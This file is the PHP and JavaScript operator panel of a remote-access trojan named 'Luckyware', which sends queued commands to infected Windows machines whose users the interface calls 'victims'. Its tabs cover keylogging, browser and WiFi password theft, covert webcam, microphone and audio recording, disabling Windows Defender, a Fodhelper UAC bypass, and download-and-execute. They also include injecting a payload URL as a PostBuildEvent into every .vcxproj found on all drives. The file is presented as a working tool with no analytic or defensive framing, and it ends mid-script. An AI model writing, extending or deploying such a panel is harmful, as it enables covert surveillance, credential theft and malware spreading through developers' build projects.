<?php
// Luckyware Advanced Control Panel - All Features
session_start();
require_once 'config.php';

// Get database connection
$conn = getDB();

// Check authentication
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

// Get client ID from URL
$client_id = isset($_GET['client_id']) ? $_GET['client_id'] : null;
if(!$client_id) {
    die("No client selected");
}

// Get client info
$stmt = $conn->prepare("SELECT * FROM clients WHERE client_id = ?");
$stmt->execute([$client_id]);
$client = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$client) {
    die("Client not found");
}

// Handle result polling via AJAX
if(isset($_GET['get_result'])) {
    $command_id = $_GET['get_result'];
    
    $stmt = $conn->prepare("SELECT status, result FROM commands WHERE id = ? AND client_id = ?");
    $stmt->execute([$command_id, $client_id]);
    $command = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if($command) {
        echo json_encode([
            'status' => $command['status'],
            'result' => $command['result']
        ]);
    } else {
        echo json_encode(['status' => 'not_found', 'result' => null]);
    }
    exit;
}

// Handle command submission via AJAX
if(isset($_POST['ajax_command'])) {
    $command_type = $_POST['command_type'];
    $command_data = isset($_POST['command_data']) ? $_POST['command_data'] : '';
    
    $stmt = $conn->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, ?, ?, 'pending', NOW())");
    $stmt->execute([$client_id, $command_type, $command_data]);
    
    $command_id = $conn->lastInsertId();
    
    echo json_encode(['success' => true, 'message' => 'Command sent', 'command_id' => $command_id]);
    exit;
}

// Get recent command results
$stmt = $conn->prepare("SELECT * FROM commands WHERE client_id = ? ORDER BY created_at DESC LIMIT 50");
$stmt->execute([$client_id]);
$commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Luckyware Control - <?= htmlspecialchars($client['computer_name']) ?></title>
    <meta charset="UTF-8">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0e27; color: #e0e0e0; }
        
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 1.5em; }
        .header .client-info { font-size: 0.9em; opacity: 0.9; }
        
        .container { display: flex; height: calc(100vh - 70px); }
        .sidebar { width: 250px; background: #16213e; padding: 20px; overflow-y: auto; }
        .sidebar h3 { color: #3282b8; margin: 20px 0 10px 0; font-size: 0.9em; text-transform: uppercase; }
        .sidebar button { width: 100%; background: #1a2332; color: #e0e0e0; border: none; padding: 12px; margin: 5px 0; cursor: pointer; border-radius: 5px; text-align: left; transition: all 0.2s; }
        .sidebar button:hover { background: #3282b8; }
        .sidebar button.active { background: #667eea; }
        
        .main-content { flex: 1; padding: 20px; overflow-y: auto; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        
        .card { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .card h2 { color: #3282b8; margin-bottom: 15px; font-size: 1.3em; }
        
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; color: #aaa; font-size: 0.9em; }
        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 10px; background: #0a0e27; color: #e0e0e0; border: 1px solid #3282b8; border-radius: 5px; font-family: inherit; }
        .form-group textarea { min-height: 80px; font-family: monospace; }
        
        .btn { background: #3282b8; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; transition: all 0.2s; }
        .btn:hover { background: #667eea; }
        .btn-danger { background: #ff6b6b; }
        .btn-danger:hover { background: #ee5a52; }
        .btn-success { background: #51cf66; }
        .btn-warning { background: #ffd93d; color: #333; }
        
        .btn-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
        .btn-grid button { width: 100%; }
        
        .result-box { background: #0a0e27; padding: 15px; border-radius: 5px; margin-top: 15px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 0.9em; white-space: pre-wrap; word-wrap: break-word; }
        
        .command-history { max-height: 500px; overflow-y: auto; }
        .command-item { background: #0a0e27; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 3px solid #3282b8; }
        .command-item .cmd-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .command-item .cmd-type { color: #667eea; font-weight: bold; }
        .command-item .cmd-status { padding: 2px 8px; border-radius: 3px; font-size: 0.85em; }
        .status-pending { background: #ffd93d; color: #333; }
        .status-completed { background: #51cf66; }
        .status-failed { background: #ff6b6b; }
        
        .back-link { color: #3282b8; text-decoration: none; display: inline-block; margin-bottom: 20px; }
        .back-link:hover { color: #667eea; }
        
        .notification { position: fixed; top: 20px; right: 20px; background: #51cf66; color: white; padding: 15px 25px; border-radius: 5px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); z-index: 9999; animation: slideIn 0.3s ease; }
        .notification.error { background: #ff6b6b; }
        @keyframes slideIn { from { transform: translateX(400px); } to { transform: translateX(0); } }
        
        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🎯 Luckyware Control Panel</h1>
            <div class="client-info">
                <?= htmlspecialchars($client['computer_name']) ?> | 
                <?= htmlspecialchars($client['username']) ?> | 
                <?= htmlspecialchars($client['windows_version']) ?>
            </div>
        </div>
        <a href="index.php" class="btn">← Back to Clients</a>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <h3>📂 File Operations</h3>
            <button onclick="showTab('tab-filemanager')">File Manager</button>
            
            <h3>⚙️ Process & System</h3>
            <button onclick="showTab('tab-processes')">Process Manager</button>
            <button onclick="showTab('tab-registry')">Registry Editor</button>
            <button onclick="showTab('tab-system')">System Info</button>
            
            <h3>⌨️ Surveillance</h3>
            <button onclick="showTab('tab-keylogger')">Keylogger</button>
            <button onclick="showTab('tab-clipboard')">Clipboard</button>
            <button onclick="showTab('tab-windows')">Active Windows</button>
            <button onclick="showTab('tab-network')">Network Monitor</button>
            <button onclick="showTab('tab-screenshot')">Screenshots</button>
            
            <h3>🎤 Media Capture</h3>
            <button onclick="showTab('tab-microphone')">Microphone</button>
            <button onclick="showTab('tab-systemaudio')">System Audio</button>
            <button onclick="showTab('tab-webcam')">Webcam</button>
            
            <h3>🔑 Data Theft</h3>
            <button onclick="showTab('tab-passwords')">Password Recovery</button>
            <button onclick="showTab('tab-wifi')">WiFi Passwords</button>
            
            <h3>🛡️ System Control</h3>
            <button onclick="showTab('tab-power')">Power Options</button>
            <button onclick="showTab('tab-defender')">Windows Defender</button>
            <button onclick="showTab('tab-uac')">UAC Bypass</button>
            <button onclick="showTab('tab-ui')">UI Manipulation</button>
            
            <h3>💻 Shell & Advanced</h3>
            <button onclick="showTab('tab-shell')">Shell Commands</button>
            <button onclick="showTab('tab-wallpaper')">Wallpaper</button>
            <button onclick="showTab('tab-projects')">Inject .vcxproj</button>
            <button onclick="showTab('tab-download')">Download & Execute</button>
            
            <h3>📊 Activity</h3>
            <button onclick="showTab('tab-history')">Command History</button>
        </div>
        
        <div class="main-content">
            <div id="notification" style="display: none;"></div>
            
            <!-- FILE MANAGER TAB -->
            <div id="tab-filemanager" class="tab-content active">
                <div class="card">
                    <h2>📂 File Manager</h2>
                    
                    <div class="form-group">
                        <label>List Directory</label>
                        <input type="text" id="fm_listdir_path" placeholder="C:\Users" value="C:\">
                        <button class="btn" onclick="sendCommand('fm:listdir', $val('fm_listdir_path'))">List Files</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Get Drives</label>
                        <button class="btn" onclick="sendCommand('fm:getdrives', '')">List All Drives</button>
                    </div>
                    
                    <div class="two-col">
                        <div class="form-group">
                            <label>Download File</label>
                            <input type="text" id="fm_download_path" placeholder="C:\file.txt">
                            <button class="btn" onclick="sendCommand('fm:download', $val('fm_download_path'))">Download</button>
                        </div>
                        
                        <div class="form-group">
                            <label>Delete File/Folder</label>
                            <input type="text" id="fm_delete_path" placeholder="C:\file.txt">
                            <button class="btn btn-danger" onclick="sendCommand('fm:delete', $val('fm_delete_path'))">Delete</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Execute File</label>
                        <input type="text" id="fm_execute_path" placeholder="C:\program.exe">
                        <div class="three-col">
                            <button class="btn" onclick="sendCommand('fm:execute', $val('fm_execute_path'))">Execute Visible</button>
                            <button class="btn" onclick="sendCommand('fm:execute', $val('fm_execute_path') + '|hidden')">Execute Hidden</button>
                            <button class="btn" onclick="sendCommand('fm:fileinfo', $val('fm_execute_path'))">Get Info</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Search Files</label>
                        <input type="text" id="fm_search_root" placeholder="C:\" style="width: 48%; display: inline-block;">
                        <input type="text" id="fm_search_pattern" placeholder="*.txt" style="width: 48%; display: inline-block; margin-left: 2%;">
                        <button class="btn" onclick="sendCommand('fm:search', $val('fm_search_root') + '|' + $val('fm_search_pattern'))">Search</button>
                    </div>
                    
                    <div class="result-box" id="result-filemanager">Results will appear here...</div>
                </div>
            </div>
            
            <!-- PROCESS MANAGER TAB -->
            <div id="tab-processes" class="tab-content">
                <div class="card">
                    <h2>⚙️ Process Manager</h2>
                    
                    <button class="btn" onclick="sendCommand('pm:list', '')">List All Processes</button>
                    
                    <div class="form-group">
                        <label>Kill Process by PID</label>
                        <input type="text" id="pm_kill_pid" placeholder="1234">
                        <button class="btn btn-danger" onclick="sendCommand('pm:kill', $val('pm_kill_pid'))">Kill Process</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Kill Process by Name</label>
                        <input type="text" id="pm_kill_name" placeholder="notepad.exe">
                        <button class="btn btn-danger" onclick="sendCommand('pm:killbyname', $val('pm_kill_name'))">Kill by Name</button>
                    </div>
                    
                    <div class="two-col">
                        <div class="form-group">
                            <label>Suspend Process (PID)</label>
                            <input type="text" id="pm_suspend_pid" placeholder="1234">
                            <button class="btn" onclick="sendCommand('pm:suspend', $val('pm_suspend_pid'))">Suspend</button>
                        </div>
                        
                        <div class="form-group">
                            <label>Resume Process (PID)</label>
                            <input type="text" id="pm_resume_pid" placeholder="1234">
                            <button class="btn btn-success" onclick="sendCommand('pm:resume', $val('pm_resume_pid'))">Resume</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Start New Process</label>
                        <input type="text" id="pm_start_path" placeholder="C:\program.exe">
                        <div class="two-col">
                            <button class="btn" onclick="sendCommand('pm:start', $val('pm_start_path'))">Start Visible</button>
                            <button class="btn" onclick="sendCommand('pm:start', $val('pm_start_path') + '|hidden')">Start Hidden</button>
                        </div>
                    </div>
                    
                    <div class="result-box" id="result-processes">Results will appear here...</div>
                </div>
            </div>
            
            <!-- REGISTRY EDITOR TAB -->
            <div id="tab-registry" class="tab-content">
                <div class="card">
                    <h2>📝 Registry Editor</h2>
                    
                    <div class="form-group">
                        <label>List Registry Keys</label>
                        <select id="reg_hive">
                            <option value="HKCU">HKEY_CURRENT_USER</option>
                            <option value="HKLM">HKEY_LOCAL_MACHINE</option>
                            <option value="HKCR">HKEY_CLASSES_ROOT</option>
                            <option value="HKU">HKEY_USERS</option>
                        </select>
                        <input type="text" id="reg_subkey" placeholder="Software\Microsoft" value="Software\Microsoft">
                        <button class="btn" onclick="sendCommand('reg:listkeys', $val('reg_hive') + '|' + $val('reg_subkey'))">List Keys</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Read Value</label>
                        <input type="text" id="reg_read_value" placeholder="ValueName">
                        <button class="btn" onclick="sendCommand('reg:readvalue', $val('reg_hive') + '|' + $val('reg_subkey') + '|' + $val('reg_read_value'))">Read Value</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Write Value</label>
                        <input type="text" id="reg_write_name" placeholder="ValueName" style="width: 32%; display: inline-block;">
                        <select id="reg_write_type" style="width: 32%; display: inline-block; margin-left: 1%;">
                            <option value="REG_SZ">REG_SZ (String)</option>
                            <option value="REG_DWORD">REG_DWORD (Number)</option>
                            <option value="REG_QWORD">REG_QWORD (Large Number)</option>
                        </select>
                        <input type="text" id="reg_write_data" placeholder="Data" style="width: 32%; display: inline-block; margin-left: 1%;">
                        <button class="btn" onclick="sendCommand('reg:writevalue', $val('reg_hive') + '|' + $val('reg_subkey') + '|' + $val('reg_write_name') + '|' + $val('reg_write_type') + '|' + $val('reg_write_data'))">Write Value</button>
                    </div>
                    
                    <div class="result-box" id="result-registry">Results will appear here...</div>
                </div>
            </div>
            
            <!-- KEYLOGGER TAB -->
            <div id="tab-keylogger" class="tab-content">
                <div class="card">
                    <h2>⌨️ Keylogger</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('kl:start', 'offline')">Start Offline Mode</button>
                        <button class="btn btn-success" onclick="sendCommand('kl:start', 'online')">Start Online Mode</button>
                        <button class="btn btn-danger" onclick="sendCommand('kl:stop', '')">Stop Keylogger</button>
                        <button class="btn" onclick="sendCommand('kl:getlogs', '')">Get Logs</button>
                        <button class="btn" onclick="sendCommand('kl:clearlogs', '')">Clear Logs</button>
                        <button class="btn" onclick="sendCommand('kl:status', '')">Get Status</button>
                    </div>
                    
                    <div class="result-box" id="result-keylogger">Results will appear here...</div>
                </div>
            </div>
            
            <!-- PASSWORD RECOVERY TAB -->
            <div id="tab-passwords" class="tab-content">
                <div class="card">
                    <h2>🔑 Password Recovery</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('pw:all', '')">Get ALL Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:chrome', '')">Chrome Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:edge', '')">Edge Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:opera', '')">Opera Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:brave', '')">Brave Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:wifi', '')">WiFi Passwords</button>
                    </div>
                    
                    <div class="result-box" id="result-passwords">Results will appear here...</div>
                </div>
            </div>
            
            <!-- SYSTEM CONTROL - POWER TAB -->
            <div id="tab-power" class="tab-content">
                <div class="card">
                    <h2>⚡ Power Options</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" onclick="confirmAction('sc:shutdown', '', 'Shutdown the system?')">Shutdown</button>
                        <button class="btn btn-warning" onclick="confirmAction('sc:restart', '', 'Restart the system?')">Restart</button>
                        <button class="btn" onclick="sendCommand('sc:logoff', '')">Logoff</button>
                    </div>
                    
                    <div class="result-box" id="result-power">Results will appear here...</div>
                </div>
            </div>
            
            <!-- WINDOWS DEFENDER TAB -->
            <div id="tab-defender" class="tab-content">
                <div class="card">
                    <h2>🛡️ Windows Defender Control</h2>
                    
                    <button class="btn btn-danger" onclick="sendCommand('sc:disablewd', '')">Disable Windows Defender</button>
                    
                    <div class="form-group">
                        <label>Add Exclusion Path</label>
                        <input type="text" id="wd_exclusion" placeholder="C:\Path\To\Exclude">
                        <button class="btn" onclick="sendCommand('sc:wdexclusion', $val('wd_exclusion'))">Add Exclusion</button>
                    </div>
                    
                    <div class="result-box" id="result-defender">Results will appear here...</div>
                </div>
            </div>
            
            <!-- UAC BYPASS TAB -->
            <div id="tab-uac" class="tab-content">
                <div class="card">
                    <h2>🔓 UAC Bypass</h2>
                    
                    <div class="form-group">
                        <label>Fodhelper UAC Bypass</label>
                        <textarea id="uac_command" placeholder="powershell -Command &quot;Start-Process cmd -Verb RunAs&quot;"></textarea>
                        <button class="btn btn-warning" onclick="sendCommand('sc:uacbypass', $val('uac_command'))">Execute with UAC Bypass</button>
                    </div>
                    
                    <div class="result-box" id="result-uac">Results will appear here...</div>
                </div>
            </div>
            
            <!-- UI MANIPULATION TAB -->
            <div id="tab-ui" class="tab-content">
                <div class="card">
                    <h2>🎨 UI Manipulation</h2>
                    
                    <div class="btn-grid">
                        <button class="btn" onclick="sendCommand('sc:desktopicons', 'hide')">Hide Desktop Icons</button>
                        <button class="btn" onclick="sendCommand('sc:desktopicons', 'show')">Show Desktop Icons</button>
                        <button class="btn" onclick="sendCommand('sc:taskbar', 'hide')">Hide Taskbar</button>
                        <button class="btn" onclick="sendCommand('sc:taskbar', 'show')">Show Taskbar</button>
                        <button class="btn" onclick="sendCommand('sc:swapmouse', 'swap')">Swap Mouse Buttons</button>
                        <button class="btn" onclick="sendCommand('sc:swapmouse', 'normal')">Normal Mouse</button>
                        <button class="btn" onclick="sendCommand('sc:explorer', 'kill')">Kill Explorer</button>
                        <button class="btn" onclick="sendCommand('sc:explorer', 'start')">Start Explorer</button>
                        <button class="btn" onclick="sendCommand('sc:cdrom', 'open')">Open CD-ROM</button>
                        <button class="btn" onclick="sendCommand('sc:cdrom', 'close')">Close CD-ROM</button>
                        <button class="btn" onclick="sendCommand('sc:screen', 'off')">Screen Off</button>
                        <button class="btn" onclick="sendCommand('sc:screen', 'on')">Screen On</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'up')">Volume Up</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'down')">Volume Down</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'mute')">Mute/Unmute</button>
                        <button class="btn btn-danger" onclick="confirmAction('sc:bsod', '', 'Invoke BSOD? This will crash the system!')">Invoke BSOD</button>
                    </div>
                    
                    <div class="result-box" id="result-ui">Results will appear here...</div>
                </div>
            </div>
            
            <!-- CLIPBOARD TAB -->
            <div id="tab-clipboard" class="tab-content">
                <div class="card">
                    <h2>📋 Clipboard Manager</h2>
                    
                    <button class="btn" onclick="sendCommand('surv:getclipboard', '')">Get Clipboard Content</button>
                    <button class="btn btn-danger" onclick="sendCommand('surv:clearclipboard', '')">Clear Clipboard</button>
                    
                    <div class="form-group">
                        <label>Set Clipboard Text</label>
                        <textarea id="clipboard_text" placeholder="Enter text to set in clipboard"></textarea>
                        <button class="btn" onclick="sendCommand('surv:setclipboard', $val('clipboard_text'))">Set Clipboard</button>
                    </div>
                    
                    <div class="result-box" id="result-clipboard">Results will appear here...</div>
                </div>
            </div>
            
            <!-- ACTIVE WINDOWS TAB -->
            <div id="tab-windows" class="tab-content">
                <div class="card">
                    <h2>🪟 Active Windows</h2>
                    
                    <div class="btn-grid">
                        <button class="btn" onclick="sendCommand('surv:activewindow', '')">Get Active Window</button>
                        <button class="btn" onclick="sendCommand('surv:allwindows', '')">List All Windows</button>
                        <button class="btn" onclick="sendCommand('surv:startupprograms', '')">Startup Programs</button>
                        <button class="btn" onclick="sendCommand('surv:installedprograms', '')">Installed Programs</button>
                    </div>
                    
                    <div class="result-box" id="result-windows">Results will appear here...</div>
                </div>
            </div>
            
            <!-- NETWORK MONITOR TAB -->
            <div id="tab-network" class="tab-content">
                <div class="card">
                    <h2>🌐 Network Monitor</h2>
                    
                    <button class="btn" onclick="sendCommand('surv:tcpconnections', '')">List TCP Connections</button>
                    
                    <div class="result-box" id="result-network">Results will appear here...</div>
                </div>
            </div>
            
            <!-- SCREENSHOT TAB -->
            <div id="tab-screenshot" class="tab-content">
                <div class="card">
                    <h2>📸 Screenshot</h2>
                    
                    <button class="btn" onclick="takeScreenshot()">Take Screenshot</button>
                    
                    <div id="screenshot-container" style="margin-top: 20px;">
                        <?php
                        // Show latest screenshot from command history
                        $screenshot_stmt = $conn->prepare("SELECT * FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND result IS NOT NULL AND result LIKE 'SCREENSHOT:%' ORDER BY created_at DESC LIMIT 1");
                        $screenshot_stmt->execute([$client_id]);
                        $latest_screenshot = $screenshot_stmt->fetch(PDO::FETCH_ASSOC);
                        
                        if($latest_screenshot && $latest_screenshot['result']):
                            $base64_data = substr($latest_screenshot['result'], 11); // Remove "SCREENSHOT:" prefix
                            $timestamp = date('Y-m-d H:i:s', strtotime($latest_screenshot['created_at']));
                        ?>
                        <div style="background: #0a0e27; padding: 15px; border-radius: 5px;">
                            <p style="color: #51cf66; margin-bottom: 10px;">✓ Latest Screenshot (<?= $timestamp ?>)</p>
                            <img src="data:image/jpeg;base64,<?= htmlspecialchars($base64_data) ?>" 
                                 style="max-width: 100%; border-radius: 5px; cursor: pointer;" 
                                 onclick="window.open(this.src, '_blank')"
                                 alt="Screenshot">
                            <p style="color: #aaa; font-size: 0.9em; margin-top: 10px;">
                                📌 Click image to open in new tab | Right-click to save
                            </p>
                        </div>
                        <?php else: ?>
                        <div style="text-align: center; padding: 40px; color: #aaa; background: #0a0e27; border-radius: 5px;">
                            <p>No screenshots taken yet</p>
                            <p style="font-size: 0.9em; margin-top: 10px;">Click "Take Screenshot" to capture the screen</p>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="result-box" id="result-screenshot">Results will appear here...</div>
                </div>
            </div>
            
            <!-- MICROPHONE TAB -->
            <div id="tab-microphone" class="tab-content">
                <div class="card">
                    <h2>🎤 Microphone Recording</h2>
                    
                    <div class="form-group">
                        <label>Recording Duration (seconds)</label>
                        <input type="number" id="mic_duration" value="5" min="1" max="60">
                    </div>
                    
                    <button class="btn btn-success" onclick="sendCommand('media:microphone', $val('mic_duration'))">🔴 Record Microphone</button>
                    
                    <div class="result-box" id="result-microphone">Results will appear here...</div>
                </div>
            </div>
            
            <!-- SYSTEM AUDIO TAB -->
            <div id="tab-systemaudio" class="tab-content">
                <div class="card">
                    <h2>🔊 System Audio Recording</h2>
                    
                    <div class="form-group">
                        <label>Recording Duration (seconds)</label>
                        <input type="number" id="audio_duration" value="5" min="1" max="60">
                    </div>
                    
                    <button class="btn btn-success" onclick="sendCommand('media:systemaudio', $val('audio_duration'))">🔴 Record System Audio</button>
                    
                    <div class="result-box" id="result-systemaudio">Results will appear here...</div>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #1a2332; border-radius: 5px; color: #aaa; font-size: 0.9em;">
                        <p>📌 <strong>System Audio</strong> records what the victim hears (music, videos, calls, notifications)</p>
                        <p>📌 Uses loopback recording from speakers/headphones output</p>
                    </div>
                </div>
            </div>
            
            <!-- WEBCAM TAB -->
            <div id="tab-webcam" class="tab-content">
                <div class="card">
                    <h2>📷 Webcam Capture</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('media:webcam', '')">📸 Take Photo</button>
                        <button class="btn btn-danger" onclick="sendCommand('media:webcamvideo', '10')">🎥 Record Video (10s)</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Video Duration (seconds)</label>
                        <input type="number" id="video_duration" value="10" min="1" max="60">
                        <button class="btn" onclick="sendCommand('media:webcamvideo', $val('video_duration'))">🎥 Record Custom Duration</button>
                    </div>
                    
                    <div class="result-box" id="result-webcam">Results will appear here...</div>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #1a2332; border-radius: 5px; color: #aaa; font-size: 0.9em;">
                        <p>📌 Photos saved as BMP (640x480)</p>
                        <p>📌 Videos saved as AVI (640x480 @ 15fps)</p>
                        <p>📌 Files saved to victim's temp folder</p>
                    </div>
                </div>
            </div>
            
            <!-- SHELL COMMANDS TAB -->
            <div id="tab-shell" class="tab-content">
                <div class="card">
                    <h2>💻 Shell Commands</h2>
                    
                    <div class="form-group">
                        <label>Execute Shell Command</label>
                        <textarea id="shell_command" placeholder="dir C:\ or whoami"></textarea>
                        <button class="btn" onclick="sendCommand('shell', $val('shell_command'))">Execute</button>
                    </div>
                    
                    <button class="btn" onclick="sendCommand('sysinfo', '')">Get System Info</button>
                    
                    <div class="result-box" id="result-shell">Results will appear here...</div>
                </div>
            </div>
            
            <!-- WALLPAPER TAB -->
            <div id="tab-wallpaper" class="tab-content">
                <div class="card">
                    <h2>🖼️ Wallpaper Changer</h2>
                    
                    <div class="form-group">
                        <label>Image/Video URL (PNG, JPG, GIF, BMP, MP4)</label>
                        <input type="text" id="wallpaper_url" placeholder="https://example.com/image.png">
                        <button class="btn" onclick="sendCommand('wallpaper', $val('wallpaper_url'))">Change Wallpaper</button>
                    </div>
                    
                    <div class="result-box" id="result-wallpaper">Results will appear here...</div>
                </div>
            </div>
            
            <!-- INJECT .VCXPROJ TAB -->
            <div id="tab-projects" class="tab-content">
                <div class="card">
                    <h2>💉 Inject .vcxproj Files</h2>
                    
                    <div class="form-group">
                        <label>Payload Download URL</label>
                        <input type="text" id="project_url" placeholder="https://example.com/malware.exe">
                        <button class="btn btn-warning" onclick="sendCommand('findprojects', $val('project_url'))">Scan ALL Drives & Inject</button>
                    </div>
                    
                    <p style="color: #ffd93d; margin: 10px 0;">⚠️ This will scan C:, D:, E:, etc. and inject PostBuildEvent into every .vcxproj found!</p>
                    
                    <div class="result-box" id="result-projects">Results will appear here...</div>
                </div>
            </div>
            
            <!-- DOWNLOAD & EXECUTE TAB -->
            <div id="tab-download" class="tab-content">
                <div class="card">
                    <h2>⬇️ Download & Execute</h2>
                    
                    <div class="form-group">
                        <label>File URL</label>
                        <input type="text" id="download_url" placeholder="https://example.com/file.exe">
                        <button class="btn btn-warning" onclick="sendCommand('download_exec', $val('download_url'))">Download & Execute</button>
                    </div>
                    
                    <div class="result-box" id="result-download">Results will appear here...</div>
                </div>
            </div>
            
            <!-- COMMAND HISTORY TAB -->
            <div id="tab-history" class="tab-content">
                <div class="card">
                    <h2>📊 Command History</h2>
                    
                    <button class="btn" onclick="window.location.href = 'control_panel.php?client_id=<?= $client_id ?>'">🔄 Refresh Now</button>
                    
                    <p style="color: #aaa; margin: 10px 0; font-size: 0.9em;">
                        📡 Auto-refresh: This page will automatically refresh every 10 seconds to show new results
                    </p>
                    
                    <div class="command-history">
                        <?php if(empty($commands)): ?>
                        <div style="text-align: center; padding: 40px; color: #aaa;">
                            <p>No commands sent yet</p>
                            <p style="font-size: 0.9em; margin-top: 10px;">Send a command from any tab to see results here</p>
                        </div>
                        <?php else: ?>
                        <?php foreach($commands as $cmd): ?>
                        <div class="command-item">
                            <div class="cmd-header">
                                <span class="cmd-type"><?= htmlspecialchars($cmd['command_type']) ?></span>
                                <span class="cmd-status status-<?= $cmd['status'] ?>"><?= strtoupper($cmd['status']) ?></span>
                            </div>
                            <div style="color: #aaa; font-size: 0.85em; margin-bottom: 5px;">
                                ⏰ <?= date('Y-m-d H:i:s', strtotime($cmd['created_at'])) ?>
                            </div>
                            <?php if($cmd['command_data']): ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; margin-bottom: 8px; font-family: monospace; font-size: 0.9em;">
                                📝 Data: <?= htmlspecialchars($cmd['command_data']) ?>
                            </div>
                            <?php endif; ?>
                            <?php if($cmd['result']): ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; font-family: monospace; font-size: 0.9em; max-height: 300px; overflow-y: auto; white-space: pre-wrap;">
                                ✅ Result:
                                <?= nl2br(htmlspecialchars($cmd['result'])) ?>
                            </div>
                            <?php else: ?>
                            <div style="background: #0a0e27; padding: 8px; border-radius: 3px; color: #ffd93d; font-size: 0.9em;">
                                ⏳ Waiting for client to execute command...
                            </div>
                            <?php endif; ?>
                        </div>
                        <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
            
        </div>
    </div>
    
    <script>
        // Helper function for getting element values
        function $val(id) {
            const elem = document.getElementById(id);
            return elem ? elem.value : '';
        }
        
        // Show tab
        function showTab(tabId) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.sidebar button').forEach(btn => btn.classList.remove('active'));
            
            // Show selected tab
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            
            // Save current tab to localStorage
            localStorage.setItem('activeTab', tabId);
        }
        
        // Restore last active tab on page load
        window.addEventListener('DOMContentLoaded', function() {
            const savedTab = localStorage.getItem('activeTab');
            if(savedTab && document.getElementById(savedTab)) {
                // Hide all tabs first
                document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
                document.querySelectorAll('.sidebar button').forEach(btn => btn.classList.remove('active'));
                
                // Show saved tab
                document.getElementById(savedTab).classList.add('active');
                
                // Highlight corresponding button
                const buttons = document.querySelectorAll('.sidebar button');
                buttons.forEach(btn => {
                    if(btn.getAttribute('onclick') && btn.getAttribute('onclick').includes(savedTab)) {
                        btn.classList.add('active');
                    }
                });
            }
        });
        
        // Send command
        function sendCommand(commandType, commandData) {
            showNotification('Sending command...', 'info');
            
            // Get the current tab's result box
            const activeTab = document.querySelector('.tab-content.active');
            const resultBox = activeTab ? activeTab.querySelector('.result-box') : null;
            
            if(resultBox) {
                resultBox.innerHTML = '<div style="color: #ffd93d;">⏳ Sending command...</div>';
            }
            
            fetch('control_panel.php?client_id=<?= $client_id ?>', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'ajax_command=1&command_type=' + encodeURIComponent(commandType) + '&command_data=' + encodeURIComponent(commandData)
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    showNotification('✓ Command sent! Polling for result...', 'success');
                    
                    if(resultBox) {
                        resultBox.innerHTML = '<div style="color: #51cf66;">✓ Command sent to client. Waiting for response...</div><div style="color: #aaa; margin-top: 10px;">Polling for results...</div>';
                    }
                    
                    // Save current tab
                    const currentTab = document.querySelector('.tab-content.active');
                    if(currentTab) {
                        localStorage.setItem('activeTab', currentTab.id);
                    }
                    
                    // Start polling for result (check every 2 seconds)
                    if(data.command_id) {
                        pollForResult(data.command_id, resultBox);
                    }
                } else {
                    showNotification('✗ Error: ' + data.message, 'error');
                    if(resultBox) {
                        resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Error: ' + data.message + '</div>';
                    }
                }
            })
            .catch(error => {
                showNotification('✗ Network error: ' + error, 'error');
                console.error('Error:', error);
                if(resultBox) {
                    resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Network error: ' + error + '</div>';
                }
            });
